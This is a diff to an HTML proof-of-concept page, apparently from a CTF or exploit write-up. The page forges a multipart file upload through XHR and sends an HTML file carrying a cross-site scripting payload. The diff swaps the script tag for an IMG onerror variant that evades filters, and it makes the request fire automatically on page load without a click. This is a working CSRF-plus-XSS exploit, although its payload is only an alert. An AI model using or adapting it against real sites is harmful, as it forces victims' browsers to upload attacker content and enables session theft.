@@ -14,7 +14,7 @@
           "Content-Disposition: form-data; name=\"files\"; filename=\"ownados.html\"\r\n" + 
           "Content-Type: application/octet-stream\r\n" + 
           "\r\n" + 
-          "<script>alert('owned by fireshell')</script>" + 
+          "<!DOCTYPE html><IMG  SRC=/ onerror=\"alert('owned by fireshell')\"></img>" + 
           "\r\n" + 
           "-----------------------------14280674991253216821295500771--\r\n";
         var aBody = new Uint8Array(body.length);
@@ -22,9 +22,8 @@
           aBody[i] = body.charCodeAt(i); 
         xhr.send(new Blob([aBody]));
       }
+      submitRequest();
     </script>
-    <form action="#">
-      <input type="button" value="Submit request" onclick="submitRequest();" />
-    </form>
+
   </body>
 </html>
